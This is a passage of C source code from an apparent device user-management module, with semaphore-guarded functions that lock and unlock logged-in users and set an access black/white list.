	memcpy(para, &sUserManager->para, sizeof(SModUserPara));
	sem_post(&sUserManager->sem);
	return 0;
}

s32 ModUserLockUser(UserCenter pCenter, u32 nUserId)
{
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	if((NULL == pCenter) || (NULL == UserGetNameFromId(sUserManager->pUserLogined, nUserId)))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	s32 ret = 0;
	sem_wait(&sUserManager->sem);
	SModUserLoginedInfo* info =  sUserManager->pUserLogined;
	while(info)
	{
		if(info->id == nUserId)
		{
			info->IsLocked = 1;
			break;
		}
		info = info->pNext;
	}
	if(info == NULL)
	{
		fprintf(stderr, "Warnning: Lock user [%d] failed! function:%s\n", nUserId, __FUNCTION__);
		ret = -1;
	}
	sem_post(&sUserManager->sem);
	return ret;
}

s32 ModUserUnlockUser(UserCenter pCenter, u32 nUserId)
{
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	if((NULL == pCenter) || (NULL == UserGetNameFromId(sUserManager->pUserLogined, nUserId)))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	s32 ret = 0;
	sem_wait(&sUserManager->sem);
	SModUserLoginedInfo* info =  sUserManager->pUserLogined;
	while(info)
	{
		if(info->id == nUserId)
		{
			info->IsLocked = 0;
			break;
		}
		info = info->pNext;
	}
	if(info == NULL)
	{
		fprintf(stderr, "Warnning: Unlock user [%d] failed! function:%s\n", nUserId, __FUNCTION__);
		ret = -1;
	}
	sem_post(&sUserManager->sem);
	return ret;
}

s32 ModUserSetBlackWhiteList(UserCenter pCenter, SModUserBlackWhiteList* pList)
{
	if((NULL == pCenter) || (NULL == pList))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	memcpy(&sUserManager->sBlackWhiteList, pList, sizeof(SModUserBlackWhiteList));
	sem_post(&sUserManager->sem);
	return 0;
}

/***********************************业务层接口结束****************************************/
